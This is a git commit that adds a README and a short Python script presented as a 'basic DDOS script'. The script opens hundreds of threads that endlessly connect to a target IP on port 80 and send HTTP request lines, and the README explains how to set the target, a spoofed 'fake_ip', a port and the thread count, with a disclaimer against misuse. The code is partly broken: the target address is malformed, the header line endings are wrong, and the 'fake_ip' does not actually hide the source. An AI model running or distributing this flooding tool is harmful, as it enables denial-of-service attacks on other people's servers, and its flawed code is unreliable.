b556a3439aec6bcb1ef0fc2099b2d56c4bf79d70
steve j <speardragon6@gmail.com>
2021-10-17 07:16:20 +0530

    first commit

---
+++ readME.txt
@@ -0,0 +1,13 @@
+Hello there,
+this is a basic DDOS script used for information only,
+any misuse is completely user's responsibility.
+
+USAGE-->
+in source code,
+in target variable enter the target's IP address,
+in fake_ip variable enter the attacker IP(probably proxy),
+in port variable enter the port,
+in no_port variable enter the number of requests.
+
+FINAL WARNING ==>
+DON'T USE IT WITH MALICIOUS INTENT.
---
+++ sodd.py
@@ -0,0 +1,26 @@
+import socket 
+import threading
+
+target="10.0.0138"
+fake_ip="182.21.20.32"
+port=80
+no_attack=500
+attack_num=0 
+
+def attack():
+    while True:
+        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target,port))
+        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'),(target,port))
+        s.sendto(("HOST: " + fake_ip + "r\n\r\n").encode('ascii'),(target,port))
+        
+        global attack_num
+        attack_num+=1
+        print(attack_num)
+
+        s.close()
+    
+for i in range(no_attack):
+    thread=threading.Thread(target=attack)
+    thread.start()
+
